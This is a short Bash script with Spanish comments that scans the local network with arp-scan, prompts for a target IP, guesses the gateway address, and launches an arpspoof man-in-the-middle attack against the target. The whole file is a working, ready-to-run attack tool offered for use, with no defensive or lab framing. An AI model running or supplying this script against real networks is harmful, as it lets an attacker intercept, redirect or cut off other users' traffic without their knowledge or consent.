#!/bin/bash
# Author: Shevanio
# Description: Script para analizar redes y realizar ataques ARP spoofing.
#
# Colours
greenColour="\e[0;32m\033[1m"
endColour="\033[0m\e[0m"
redColour="\e[0;31m\033[1m"
blueColour="\e[0;34m\033[1m"
yellowColour="\e[0;33m\033[1m"
purpleColour="\e[0;35m\033[1m"
turquoiseColour="\e[0;36m\033[1m"
grayColour="\e[0;37m\033[1m"

function ctrl_c(){
  echo -e "\n\n${redColour}[!] Saliendo...\n${endColour}"
  exit 1
}

# Ctrl + C
trap ctrl_c INT

# Verificar si arp-scan está instalado
check_herramienta(){
  if ! [ -x "$(command -v $1)" ]; then
    echo -e "${redColour}Error: ${endColour}${purpleColour}$1${endColour}${redColour} no está instalado.${endColour}\n${blueColour}Por favor, instala ${endColour}${purpleColour}$1${endColour}${blueColour} y vuelve a intentarlo.${endColour}" >&2
    exit 1
  fi
}

check_herramienta "arp-scan"

# Obtener la lista de interfaces de red disponibles
interfaces=$(ifconfig -s | awk '{print $1}' | tail -n +2)

# Imprimir las interfaces de red disponibles
echo -e "${blueColour}Interfaz de red disponibles:${endColour}"
echo "$interfaces"

# Solicitar al usuario que ingrese la interfaz de red
read -p "$(echo -e "${blueColour}Inserte la interfaz de red que quieras analizar: ${endColour}")" interfaz

# Validar la interfaz de red ingresada por el usuario
if ! [[ $interfaces =~ (^|[[:space:]])"$interfaz"($|[[:space:]]) ]]; then
  echo -e "${redColour}Error: ${endColour}${purpleColour}$interfaz${endColour}${redColour} no es una interfaz de red válida.${endColour}" >&2
  exit 1
fi

# Obtener la dirección IP de la interfaz especificada
ip=$(ifconfig "$interfaz" | awk '/inet /{print $2}')
if [ -z "$ip" ]; then
  echo -e "${redColour}Error: ${endColour}No se pudo obtener la dirección IP de la interfaz ${purpleColour}$interfaz${endColour}.${endColour}" >&2
  read -p "$(echo -e "${yellowColour}¿Desea volver a seleccionar una interfaz de red? (s/n): ${endColour}")" respuesta
  if [ "$respuesta" = "s" ] || [ "$respuesta" = "S" ]; then
    exec "$0"
  else
    echo -e "${redColour}[!] Saliendo...\n${endColour}"
    exit 1
  fi
fi

# Ejecutar arp-scan y filtrar la salida para eliminar duplicados
echo -e "${yellowColour}Escaneando la red en busca de dispositivos:${endColour}"
sudo arp-scan -I "$interfaz" --localnet | awk '!seen[$1]++'

# Solicitar al usuario que ingrese la dirección IP objetivo
read -p "$(echo -e "${blueColour}Inserte la IP de la objetivo: ${endColour}")" ip

# Validar la dirección IP ingresada por el usuario
if ! [[ $ip =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
  echo -e "${redColour}Error: ${endColour}${purpleColour}$ip${endColour}${redColour} no es una dirección IP válida.${endColour}" >&2
  exit 1
fi

# Preparar la dirección de la puerta de enlace para arpspoof
puerta_enlace=$(echo $ip | sed 's/\([0-9]\+\)$/1/g')

# Realizar el ataque ARP spoofing
echo -e "${yellowColour}Realizando ataque a ${endColour}${purpleColour}$ip${endColour}"
sudo arpspoof -i "$interfaz" -t "$ip" "$puerta_enlace"
